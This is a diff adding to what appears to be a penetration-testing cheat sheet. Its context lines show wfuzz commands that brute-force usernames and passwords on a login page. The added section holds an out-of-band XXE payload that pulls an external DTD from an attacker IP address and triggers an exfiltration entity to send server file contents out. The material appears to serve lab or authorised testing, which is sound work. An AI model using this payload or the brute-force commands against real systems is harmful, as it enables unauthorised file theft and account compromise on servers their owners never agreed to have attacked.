@@ -425,7 +425,21 @@ wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 4
 wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$URL/login.php"
 ```
 
+### Manual Copy/Payloads (when nothing works)
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE oob [
+<!ENTITY % base SYSTEM "http://192.168.88.131/external.dtd"> 
+%base;
+%external;
+%exfil;
+]>
+<entity-engine-xml>
+</entity-engine-xml>	
 
+	
+```
+	
 ### Reporting Checklist 
 
 Remember to work on a machine and document/report fully before moving on to another machine
